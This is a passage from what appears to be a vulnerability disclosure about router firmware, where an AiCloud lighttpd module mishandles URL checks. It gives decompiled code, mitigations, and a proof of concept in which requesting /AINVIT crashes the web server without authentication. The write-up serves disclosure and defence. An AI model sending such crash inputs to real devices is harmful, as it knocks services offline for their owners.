  action_value = (<span class=hljs-keyword>char</span> *)get_url_param_ualue(local_6c,<span class=hljs-string>"action"</span>);
  iVar1 = <span class=hljs-built_in>strcmp</span>(action_value,<span class=hljs-string>"register"</span>);
</code></pre><p>Note that if <code>get_url_param_ualue(local_6c, "action")</code>, which gets the form data parameter, returns a null value the subsequent call to <code>strcmp</code> will result in a NULL pointer dereference.<h4 id=mitigation-8 tabindex=-1><a class=header-anchor href=#mitigation-8 aria-hidden=true><span aria-hidden=true>###</span></a> Mitigation</h4><ol><li>Add a check for the return value of <code>get_url_param_ualue(local_6c, "action")</code> to see if it is NULL before passing into <code>strcmp</code>.</ol><h3 id=%2Fainvit-dos tabindex=-1><a class=header-anchor href=#%2Fainvit-dos aria-hidden=true><span aria-hidden=true>##</span></a> <code>/AINVIT</code> DOS</h3><p>No interaction/authentication denial of service.<h4 id=poc-9 tabindex=-1><a class=header-anchor href=#poc-9 aria-hidden=true><span aria-hidden=true>###</span></a> POC</h4><p>Visit <code>/AINVIT</code>. This will crash the lighttpd instance.<h4 id=analysis-9 tabindex=-1><a class=header-anchor href=#analysis-9 aria-hidden=true><span aria-hidden=true>###</span></a> Analysis</h4><p>In the handler <code>mod_aicloud_invite.so</code>, the comparison logic looks as such.<pre><code class=language-c>iVar1 = <span class=hljs-built_in>strncmp</span>(*param_2-&gt;field_0x108,<span class=hljs-string>"/AINVITE"</span>,<span class=hljs-number>7</span>);
<span class=hljs-keyword>if</span> (iVar1 == <span class=hljs-number>0</span>) {
  local_38 = <span class=hljs-built_in>strstr</span>(*param_2-&gt;field_0x108,<span class=hljs-string>"/AINVITE"</span>);
  local_38 = local_38 + <span class=hljs-number>1</span>;
  <span class=hljs-keyword>if</span> (local_38 == (<span class=hljs-keyword>char</span> *)<span class=hljs-number>0x0</span>) {
    param_2-&gt;field_0x80 = <span class=hljs-number>400</span>;
    param_2-&gt;field_0x48 = <span class=hljs-number>1</span>;
    ret_code = <span class=hljs-number>2</span>;
  }
</code></pre><p>Note that however, the length of “/AINVITE” is 8. Thus, if <code>/AINVIT</code> is sent, it’ll pass the strncmp comparison, while returning null for <code>strstr</code>. While there is a null check, the pointer is incremented by 1, making it worthless. This results in a null pointer dereference later.<h4 id=mitigation-9 tabindex=-1><a class=header-anchor href=#mitigation-9 aria-hidden=true><span aria-hidden=true>###</span></a> Mitigation</h4><ol><li>Perform the null check before incrementing the pointer.<li>strncmp with a length of 8</ol></div></div></div><script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>